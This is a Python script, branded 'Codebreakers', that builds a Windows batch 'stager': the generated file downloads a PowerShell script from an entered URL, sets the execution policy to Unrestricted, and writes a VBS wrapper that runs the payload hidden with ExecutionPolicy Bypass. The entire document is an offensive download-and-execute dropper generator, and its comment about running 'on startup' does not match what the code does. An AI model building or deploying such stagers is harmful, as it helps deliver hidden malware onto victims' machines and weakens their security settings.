import os
import pyfiglet
from colorama import init, Fore, Style

# Initialize colorama to enable colored output
init()

def print_codebreakers_ascii():
    ascii_art = pyfiglet.figlet_format("Codebreakers", font="slant")
    colored_ascii_art = Fore.RED + ascii_art + Style.RESET_ALL
    print(colored_ascii_art)

def create_stager(download_url, powershell_path, execution_policy, destination_folder):
    batch_script = f"""@echo off

REM Set the destination folder path for the downloaded file
set "destinationFolder={destination_folder}"

REM Download the file using PowerShell
powershell -Command "(New-Object Net.WebClient).DownloadFile('{download_url}', '%destinationFolder%\\downloaded_file.ps1')"

REM Set execution policy
"{powershell_path}" -Command "Set-ExecutionPolicy {execution_policy} -Scope CurrentUser"

REM Run the downloaded file using PowerShell invisibly on startup
echo Set objShell = CreateObject("WScript.Shell") > "%destinationFolder%\\run_invisible.vbs"
echo objShell.Run "{powershell_path} -ExecutionPolicy Bypass -File %destinationFolder%\\downloaded_file.ps1", 0, False >> "%destinationFolder%\\run_invisible.vbs"

REM Close the command prompt window
exit
"""

    return batch_script

def save_stager_to_file(stager, filename):
    with open(filename, "w") as file:
        file.write(stager)

def main():
    print_codebreakers_ascii()
    download_url = input("Enter the download URL: ")
    powershell_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    execution_policy = "Unrestricted"
    destination_folder = os.path.expanduser("~\\Downloads")

    stager = create_stager(download_url, powershell_path, execution_policy, destination_folder)

    filename = input("Enter the filename for the stager (e.g., download_and_execute.bat): ")
    save_stager_to_file(stager, filename)

    # Colored output for the script details
    print(Fore.YELLOW + "Stager created successfully.")
    print(Fore.CYAN + f"Stager filename: {filename}")
    print(Fore.CYAN + f"Download URL: {download_url}")
    print(Fore.CYAN + f"Powershell path: {powershell_path}")
    print(Fore.CYAN + f"Execution policy: {execution_policy}")
    print(Fore.CYAN + f"Destination folder: {destination_folder}" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
